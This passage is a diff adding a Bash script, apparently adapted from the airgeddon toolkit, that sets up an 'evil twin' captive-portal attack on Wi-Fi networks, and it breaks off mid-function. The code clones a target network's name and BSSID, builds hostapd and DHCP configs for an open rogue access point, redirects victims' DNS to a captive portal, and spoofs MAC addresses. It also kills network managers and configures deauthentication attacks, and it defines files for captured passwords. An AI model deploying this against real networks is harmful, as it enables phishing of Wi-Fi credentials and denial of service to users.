@@ -1,0 +1,1367 @@
+#!/usr/bin/env bash
+#shellcheck disable=SC2154,SC2034
+
+_config_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_config.conf"
+if [ ! -f "${_config_file}" ]; then
+	echo "[!] Config file not found: ${_config_file}" >&2
+	exit 1
+fi
+# shellcheck source=et_config.conf
+source <(tr -d '\r' < "${_config_file}")
+
+et_dos_attack="${et_dos_attack:-Aireplay}"
+dos_pursuit_mode="${dos_pursuit_mode:-0}"
+
+# --- Internal fixed values ---
+mdk_command="mdk4"
+check_kill_needed=1
+interface_airmon_compatible=1
+et_initial_state="Managed"
+ifacemode="Managed"
+right_arping=0
+right_arping_command="arping"
+able_to_play_sounds=0
+
+# --- Internal constants ---
+et_mode="et_captive_portal"
+AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING:-xterm}"
+AIRGEDDON_DEBUG_MODE="${AIRGEDDON_DEBUG_MODE:-false}"
+AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING="${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"
+AIRGEDDON_5GHZ_ENABLED="${AIRGEDDON_5GHZ_ENABLED:-true}"
+AIRGEDDON_6GHZ_ENABLED="${AIRGEDDON_6GHZ_ENABLED:-true}"
+AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING="${AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING:-true}"
+
+tmpdir="/tmp/et_captive_portal_$$/"
+scriptfolder="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/"
+system_tmpdir="/tmp/"
+airmon="airmon-ng"
+
+hostapd_file="hostapd.conf"
+hostapd_wpe_file="hostapd-wpe.conf"
+hostapd_wpe_log="hostapd-wpe.log"
+hostapd_wpe_default_log="hostapd-wpe.log"
+dhcpd_file="dhcpd.conf"
+dhcpd_pid_file="dhcpd.pid"
+et_processesfile="et_processes.txt"
+control_et_file="et_control.sh"
+channelfile="channel.txt"
+dnsmasq_file="dnsmasq.conf"
+webserver_file="webserver.conf"
+webserver_log="webserver.log"
+webdir="webdir/"
+indexfile="index.htm"
+checkfile="check.htm"
+cssfile="style.css"
+jsfile="script.js"
+pixelfile="pixel.png"
+attemptsfile="attempts.txt"
+currentpassfile="current_pass.txt"
+et_successfile="success.txt"
+routing_tmp_file="ag_routing_backup.txt"
+ag_orchestrator_file="ag_orchestrator.txt"
+
+internet_dns1="8.8.8.8"
+internet_dns2="8.8.4.4"
+www_port=80
+https_port=443
+dns_port=53
+loopback_interface="lo"
+loopback_ip="127.0.0.1"
+
+hostapd_wifi7_version="2.11"
+hostapd_version=""
+
+standard_resolution="1920x1080"
+xratio=6.2
+yratio=13.9
+ywindow_edge_lines=2
+ywindow_edge_pixels=18
+
+iptables_nftables=0
+iptables_cmd="iptables"
+airgeddon_instance_name="ag_$$"
+agpid_to_use="${BASHPID}"
+routing_modified=0
+nm_processes_killed=0
+clean_all_iptables_nftables=1
+dhcpd_path_changed=0
+beef_found=0
+beef_path=""
+enterprise_mode=""
+secondary_wifi_interface=""
+et_captive_portal_logpath="/tmp/et_captive_portal_captured.txt"
+advanced_captive_portal=0
+customportals_php_as_cgi=0
+captive_portal_language="ENGLISH"
+captive_portal_button_color="#1976D2"
+captive_portal_bg_color="#1565C0"
+captive_portal_shadow_color="#64B5F6"
+
+session_name="airgeddon"
+tmux_main_window="airgeddon"
+global_process_pid=""
+
+declare -a et_processes=()
+declare -a dos_pursuit_mode_pids=()
+declare -A interfaces_band_info=()
+declare -A original_macs=()
+declare -A possible_dhcp_leases_files=(
+	[0]="/var/lib/dhcp/dhclient.leases"
+	[1]="/var/lib/dhcpd/dhcpd.leases"
+	[2]="/var/lib/dhcp/dhcpd.leases"
+)
+spoofed_mac=0
+dos_pursuit_mode_attack_pid=""
+dos_pursuit_mode_scan_pid=""
+mac_spoofing_desired=0
+et_process_control_window=""
+enterprise_process_control_window=""
+
+
+# language_strings 스텁
+function language_strings() { :; }
+
+function debug_print() {
+	if "${AIRGEDDON_DEBUG_MODE:-false}"; then
+		echo "Line:${BASH_LINENO[1]} ${FUNCNAME[1]}" >&2
+	fi
+	return 0
+}
+
+function disable_rfkill() {
+	debug_print
+	if hash rfkill 2> /dev/null; then
+		rfkill unblock all > /dev/null 2>&1
+	fi
+}
+
+function set_mode_without_airmon() {
+	debug_print
+	local error
+	ip link set "${1}" down > /dev/null 2>&1
+	if [ "${2}" = "monitor" ]; then
+		iw "${1}" set monitor control > /dev/null 2>&1
+	else
+		iw "${1}" set type managed > /dev/null 2>&1
+	fi
+	error=$?
+	ip link set "${1}" up > /dev/null 2>&1
+	if [ "${error}" != 0 ]; then
+		return 1
+	fi
+	return 0
+}
+
+function physical_interface_finder() {
+	debug_print
+	local phy_iface
+	phy_iface=$(basename "$(readlink "/sys/class/net/${1}/phy80211")" 2> /dev/null)
+	echo "${phy_iface}"
+}
+
+function get_5ghz_band_info_from_phy_interface() {
+	debug_print
+	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5180(\.0)? MHz" > /dev/null; then
+		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+			return 0
+		else
+			return 2
+		fi
+	fi
+	return 1
+}
+
+function get_6ghz_band_info_from_phy_interface() {
+	debug_print
+	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5955(\.0)? MHz" > /dev/null; then
+		if ! "${AIRGEDDON_5GHZ_ENABLED:-false}"; then
+			return 2
+		fi
+		if "${AIRGEDDON_6GHZ_ENABLED:-true}"; then
+			return 0
+		else
+			return 2
+		fi
+	fi
+	return 1
+}
+
+function check_interface_supported_bands() {
+	debug_print
+	get_5ghz_band_info_from_phy_interface "${1}"
+	case "$?" in
+		"0")
+			interfaces_band_info["${2},5Ghz_allowed"]=1
+			interfaces_band_info["${2},text"]="2.4GHz, 5GHz"
+		;;
+		"1")
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="2.4GHz"
+		;;
+		"2")
+			interfaces_band_info["${2},5Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="2.4GHz, 5GHz (disabled)"
+		;;
+	esac
+	get_6ghz_band_info_from_phy_interface "${1}"
+	case "$?" in
+		"0")
+			interfaces_band_info["${2},6Ghz_allowed"]=1
+			interfaces_band_info["${2},text"]="${interfaces_band_info[${2},text]}, 6GHz"
+		;;
+		"1")
+			interfaces_band_info["${2},6Ghz_allowed"]=0
+		;;
+		"2")
+			interfaces_band_info["${2},6Ghz_allowed"]=0
+			interfaces_band_info["${2},text"]="${interfaces_band_info[${2},text]}, 6GHz (disabled)"
+		;;
+	esac
+}
+
+function detect_screen_resolution() {
+	debug_print
+	resolution_detected=0
+	if hash xdpyinfo 2> /dev/null; then
+		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
+			resolution_detected=1
+		fi
+	fi
+	if [ "${resolution_detected}" -eq 0 ]; then
+		resolution=${standard_resolution}
+	fi
+	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
+}
+
+function set_xsizes() {
+	debug_print
+	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")
+	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
+		dec_char=","
+		xtotal="${xtotal/./${dec_char}}"
+		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
+	else
+		xtotal=${xtotaltmp}
+	fi
+	xcentral_space=$((xtotal * 5 / 100))
+	xhalf=$((xtotal / 2))
+	xwindow=$((xhalf - xcentral_space))
+}
+
+function set_ysizes() {
+	debug_print
+	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
+	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
+		dec_char=","
+		ytotal="${ytotal/./${dec_char}}"
+		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
+	else
+		ytotal=${ytotaltmp}
+	fi
+	ywindowone=$((ytotal - ywindow_edge_lines))
+	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
+	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
+	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
+}
+
+function set_ypositions() {
+	debug_print
+	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))
+	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
+	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
+	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
+	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
+	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
+	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
+}
+
+function set_windows_sizes() {
+	debug_print
+	set_xsizes
+	set_ysizes
+	set_ypositions
+	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
+	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
+	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
+	g2_stdright_window="${xwindow}x${ywindowone}-0+0"
+	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
+	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
+	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
+	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
+	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
+	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
+	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
+	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
+	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
+	g5_left1="${xwindow}x${ywindowseventh}+0+0"
+	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
+	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
+	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
+	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
+	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
+	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
+	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+}
+
+function recalculate_windows_sizes() {
+	debug_print
+	detect_screen_resolution
+	set_windows_sizes
+}
+
+function manage_output() {
+	debug_print
+	local xterm_parameters
+	local tmux_command_line
+	local xterm_command_line
+	local window_name
+	local command_tail
+	xterm_parameters="${1}"
+	tmux_command_line="${2}"
+	xterm_command_line="\"${2}\""
+	window_name="${3}"
+	command_tail=" > /dev/null 2>&1 &"
+	case "${AIRGEDDON_WINDOWS_HANDLING}" in
+		"tmux")
+			local tmux_color
+			tmux_color=""
+			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
+			case "${4}" in
+				"active")
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
+				;;
+				*)
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
+				;;
+			esac
+		;;
+		"xterm")
+			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
+		;;
+	esac
+}
+
+function start_tmux_processes() {
+	debug_print
+	local window_name
+	local command_line
+	window_name="${1}"
+	command_line="${2}"
+	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
+	case "${4}" in
+		"active")
+			tmux new-window -t "${session_name}:" -n "${window_name}"
+		;;
+		*)
+			tmux new-window -d -t "${session_name}:" -n "${window_name}"
+		;;
+	esac
+	local tmux_color_cmd
+	if [ -n "${3}" ]; then
+		tmux_color_cmd="bg=#000000 fg=${3}"
+	else
+		tmux_color_cmd="bg=#000000"
+	fi
+	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
+	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
+}
+
+function get_tmux_process_id() {
+	debug_print
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		local process_cmd_line
+		local process_pid
+		process_cmd_line=$(echo "${1}" | tr -d '"')
+		while [ -z "${process_pid}" ]; do
+			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
+		done
+		global_process_pid="${process_pid}"
+	fi
+}
+
+function set_spoofed_mac() {
+	debug_print
+	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)
+	if [ "${spoofed_mac}" -eq 0 ]; then
+		spoofed_mac=1
+		declare -gA original_macs
+		original_macs["${1}"]="${current_original_mac}"
+	else
+		if [ -z "${original_macs[${1}]}" ]; then
+			original_macs["${1}"]="${current_original_mac}"
+		fi
+	fi
+	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')
+	ip link set "${1}" down > /dev/null 2>&1
+	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
+	ip link set "${1}" up > /dev/null 2>&1
+}
+
+function launch_fake_ap() {
+	debug_print
+	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
+		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
+	else
+		if [ "${check_kill_needed}" -eq 1 ]; then
+			${airmon} check kill > /dev/null 2>&1
+			nm_processes_killed=1
+		fi
+	fi
+	if [ "${mac_spoofing_desired}" -eq 1 ]; then
+		set_spoofed_mac "${interface}"
+	fi
+	recalculate_windows_sizes
+	local command
+	local log_command
+	if [ -n "${enterprise_mode}" ]; then
+		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
+		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
+		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
+		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
+		hostapd_scr_window_position=${g1_topleft_window}
+	else
+		command="hostapd \"${tmpdir}${hostapd_file}\""
+		log_command=""
+		case ${et_mode} in
+			"et_onlyap")
+				hostapd_scr_window_position=${g1_topleft_window}
+			;;
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
+				hostapd_scr_window_position=${g3_topleft_window}
+			;;
+			"et_sniffing_sslstrip2")
+				hostapd_scr_window_position=${g4_topleft_window}
+			;;
+		esac
+	fi
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
+			dos_pursuit_mode_pids=()
+		fi
+	fi
+	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+		if [ "${dos_pursuit_mode}" -eq 1 ]; then
+			dos_pursuit_mode_ap_pid=$!
+			dos_pursuit_mode_pids+=("${dos_pursuit_mode_ap_pid}")
+		fi
+	else
+		get_tmux_process_id "${command}"
+		et_processes+=("${global_process_pid}")
+		if [ "${dos_pursuit_mode}" -eq 1 ]; then
+			dos_pursuit_mode_pids+=("${global_process_pid}")
+		fi
+		global_process_pid=""
+	fi
+	sleep 3
+}
+
+function kill_pid_and_children_recursive() {
+	debug_print
+	local parent_pid=""
+	local child_pids=""
+	parent_pid="${1}"
+	child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)
+	for child_pid in ${child_pids}; do
+		kill_pid_and_children_recursive "${child_pid}"
+	done
+	if [ -n "${child_pids}" ]; then
+		pkill -P "${parent_pid}" &> /dev/null
+	fi
+	kill "${parent_pid}" &> /dev/null
+	wait "${parent_pid}" 2> /dev/null
+}
+
+function kill_dos_pursuit_mode_processes() {
+	debug_print
+	for item in "${dos_pursuit_mode_pids[@]}"; do
+		kill_pid_and_children_recursive "${item}"
+	done
+	if ! stty sane > /dev/null 2>&1; then
+		reset > /dev/null 2>&1
+	fi
+	dos_pursuit_mode_pids=()
+	sleep 1
+}
+
+function kill_tmux_windows() {
+	debug_print
+	local TMUX_WINDOWS_LIST=()
+	local current_window_name
+	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+	for item in "${TMUX_WINDOWS_LIST[@]}"; do
+		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
+		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
+			continue
+		fi
+		if [ -n "${1}" ]; then
+			if [ "${current_window_name}" = "${1}" ]; then
+				continue
+			fi
+		fi
+		tmux kill-window -t "${session_name}:${current_window_name}"
+	done
+}
+
+function kill_et_windows() {
+	debug_print
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		kill_dos_pursuit_mode_processes
+	fi
+	for item in "${et_processes[@]}"; do
+		kill_pid_and_children_recursive "${item}"
+	done
+	if [ -n "${enterprise_mode}" ]; then
+		kill "${enterprise_process_control_window}" &> /dev/null
+	else
+		kill "${et_process_control_window}" &> /dev/null
+	fi
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
+}
+
+function recover_current_channel() {
+	debug_print
+	local recovered_channel
+	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
+	if [ -n "${recovered_channel}" ]; then
+		channel="${recovered_channel}"
+	fi
+}
+
+function restore_et_interface() {
+	debug_print
+	echo
+	echo "[*] Restoring interface..."
+	disable_rfkill
+	mac_spoofing_desired=0
+	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
+	ip addr del "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
+	ip route del "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1
+	if [ "${et_initial_state}" = "Managed" ]; then
+		set_mode_without_airmon "${interface}" "managed"
+		ifacemode="Managed"
+	else
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+			ifacemode="Monitor"
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+			if [ "${interface}" != "${new_interface}" ]; then
+				interface=${new_interface}
+				phy_interface=$(physical_interface_finder "${interface}")
+				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+			fi
+		else
+			if set_mode_without_airmon "${interface}" "monitor"; then
+				ifacemode="Monitor"
+			fi
+		fi
+	fi
+	control_routing_status "end"
+}
+
+function language_strings_handling_messages() {
+	declare -gA language_strings_no_file
+	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
+}
+
+# ============================================================
+# captive portal 전용 함수
+# ============================================================
+
+function get_hostapd_version() {
+	debug_print
+	hostapd_version=$(hostapd -v 2>&1 | grep -oiP '^hostapd v\K[0-9]+\.[0-9]+')
+}
+
+function generate_fake_bssid() {
+	debug_print
+	local digit_to_change
+	local orig_digit
+	digit_to_change="${1:10:1}"
+	orig_digit=$((16#${digit_to_change}))
+	while true; do
+		((different_mac_digit=(orig_digit + 1 + RANDOM % 15) % 16))
+		[[ "${different_mac_digit}" -ne "${orig_digit}" ]] && break
+	done
+	printf %s%X%s\\n "${1::10}" "${different_mac_digit}" "${1:11}"
+}
+
+function generate_fake_essid() {
+	debug_print
+	local zwsp_char
+	zwsp_char=$'\xE2\x80\x8B'
+	if "${AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING:-true}"; then
+		printf '%s%s\n' "${1}" "${zwsp_char}"
+	else
+		printf '%s\n' "${1}"
+	fi
+}
+
+function compare_floats_greater_or_equal() {
+	debug_print
+	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
+}
+
+function set_hostapd_config() {
+	debug_print
+	get_hostapd_version
+	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
+	et_bssid=$(generate_fake_bssid "${bssid}")
+	et_essid=$(generate_fake_essid "${essid}")
+	{
+	echo -e "interface=${interface}"
+	echo -e "driver=nl80211"
+	echo -e "ssid=${et_essid}"
+	echo -e "bssid=${et_bssid}"
+	echo -e "channel=${channel}"
+	echo -e "wpa=0"
+	echo -e "ignore_broadcast_ssid=0"
+	} >> "${tmpdir}${hostapd_file}"
+	if [ "${channel}" -gt 14 ]; then
+		echo -e "hw_mode=a" >> "${tmpdir}${hostapd_file}"
+	else
+		echo -e "hw_mode=g" >> "${tmpdir}${hostapd_file}"
+	fi
+	if [ "${country_code}" != "00" ]; then
+		echo -e "country_code=${country_code}" >> "${tmpdir}${hostapd_file}"
+	fi
+	if [ "${standard_80211n}" -eq 1 ]; then
+		echo -e "ieee80211n=1" >> "${tmpdir}${hostapd_file}"
+	fi
+	if [ "${standard_80211ac}" -eq 1 ]; then
+		echo -e "ieee80211ac=1" >> "${tmpdir}${hostapd_file}"
+	fi
+	if [ "${standard_80211ax}" -eq 1 ]; then
+		echo -e "ieee80211ax=1" >> "${tmpdir}${hostapd_file}"
+	fi
+	if compare_floats_greater_or_equal "${hostapd_version}" "${hostapd_wifi7_version}"; then
+		if [ "${standard_80211be}" -eq 1 ]; then
+			echo -e "ieee80211be=1" >> "${tmpdir}${hostapd_file}"
+		fi
+	fi
+}
+
+function set_network_interface_data() {
+	debug_print
+	std_c_mask="255.255.255.0"
+	ip_mask="255.255.255.255"
+	std_c_mask_cidr="24"
+	ip_mask_cidr="32"
+	any_mask_cidr="0"
+	any_ip="0.0.0.0"
+	any_ipv6="::/0"
+	first_octet="192"
+	second_octet="169"
+	third_octet="1"
+	fourth_octet="0"
+	ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"
+	if ip route | grep ${ip_range} > /dev/null; then
+		while true; do
+			third_octet=$((third_octet + 1))
+			ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"
+			if ! ip route | grep ${ip_range} > /dev/null; then
+				break
+			fi
+		done
+	fi
+	et_ip_range="${ip_range}"
+	et_ip_router="${first_octet}.${second_octet}.${third_octet}.1"
+	et_broadcast_ip="${first_octet}.${second_octet}.${third_octet}.255"
+	et_range_start="${first_octet}.${second_octet}.${third_octet}.33"
+	et_range_stop="${first_octet}.${second_octet}.${third_octet}.100"
+}
+
+function set_dhcp_config() {
+	debug_print
+	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
+	ip link set "${interface}" up > /dev/null 2>&1
+	{
+	echo -e "authoritative;"
+	echo -e "default-lease-time 600;"
+	echo -e "max-lease-time 7200;"
+	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
+	echo -e "\toption broadcast-address ${et_broadcast_ip};"
+	echo -e "\toption routers ${et_ip_router};"
+	echo -e "\toption subnet-mask ${std_c_mask};"
+	} >> "${tmpdir}${dhcpd_file}"
+	if [ "${et_mode}" != "et_captive_portal" ]; then
+		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
+	else
+		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
+	fi
+	{
+	echo -e "\trange ${et_range_start} ${et_range_stop};"
+	echo -e "}"
+	} >> "${tmpdir}${dhcpd_file}"
+	leases_found=0
+	for item in "${!possible_dhcp_leases_files[@]}"; do
+		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
+			leases_found=1
+			key_leases_found=${item}
+			break
+		fi
+	done
+	if [ "${leases_found}" -eq 1 ]; then
+		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
+		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
+	else
+		touch "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
+		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
+		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
+	fi
+	dhcp_path="${tmpdir}${dhcpd_file}"
+	if hash apparmor_status 2> /dev/null; then
+		if apparmor_status 2> /dev/null | grep dhcpd > /dev/null; then
+			if [ -d /etc/dhcpd ]; then
+				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
+				dhcp_path="/etc/dhcpd/${dhcpd_file}"
+			elif [ -d /etc/dhcp ]; then
+				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
+				dhcp_path="/etc/dhcp/${dhcpd_file}"
+			else
+				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
+				dhcp_path="/etc/${dhcpd_file}"
+			fi
+			dhcpd_path_changed=1
+		fi
+	fi
+}
+
+function control_routing_status() {
+	debug_print
+	local saved_routing_status_found=""
+	local original_routing_status=""
+	local etset=""
+	local agpid=""
+	local et_still_running=0
+	if [ "${1}" = "start" ]; then
+		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
+		for item in "${AIRGEDDON_PIDS[@]}"; do
+			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
+			if [ -z "${saved_routing_status_found}" ]; then
+				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
+			fi
+			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" != "et" ]]; then
+				sed -ri "s:^(${agpid}):et\1:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
+			fi
+		done
+		if [ -z "${saved_routing_status_found}" ]; then
+			original_routing_status=$(cat /proc/sys/net/ipv4/ip_forward)
+			sed -ri "s:^(et${agpid_to_use})$:\1rs${original_routing_status}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
+		fi
+	else
+		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
+		for item in "${AIRGEDDON_PIDS[@]}"; do
+			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
+			if [ -z "${saved_routing_status_found}" ]; then
+				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
+			fi
+			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
+				sed -ri "s:^(et${agpid}):${agpid}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
+			fi
+			if [[ "${agpid_to_use}" != "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
+				et_still_running=1
+			fi
+		done
+		if [[ -n "${saved_routing_status_found}" ]] && [[ "${et_still_running}" -eq 0 ]]; then
+			original_routing_status="${saved_routing_status_found//[^0-9]/}"
+			echo "${original_routing_status}" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
+		fi
+	fi
+}
+
+function save_iptables_nftables() {
+	debug_print
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" list ruleset > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
+	else
+		"${iptables_cmd}-save" > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
+	fi
+}
+
+function is_first_routing_modifier_airgeddon_instance() {
+	debug_print
+	local agpid=""
+	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
+	for item in "${AIRGEDDON_PIDS[@]}"; do
+		[[ "${item}" =~ ^(et)?([0-9]+)rs[0-1]$ ]] && agpid="${BASH_REMATCH[2]}"
+		if [ "${agpid}" = "${BASHPID}" ]; then
+			clean_all_iptables_nftables=0
+			return 0
+		fi
+	done
+	return 1
+}
+
+function is_last_airgeddon_instance() {
+	debug_print
+	local agpid=""
+	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
+	for item in "${AIRGEDDON_PIDS[@]}"; do
+		[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && agpid="${BASH_REMATCH[2]}"
+		if [[ "${agpid}" != "${agpid_to_use}" ]] && ps -p "${agpid}" > /dev/null 2>&1; then
+			return 1
+		fi
+	done
+	return 0
+}
+
+function clean_all_iptables_nftables() {
+	debug_print
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" flush ruleset 2> /dev/null
+	else
+		"${iptables_cmd}" -F 2> /dev/null
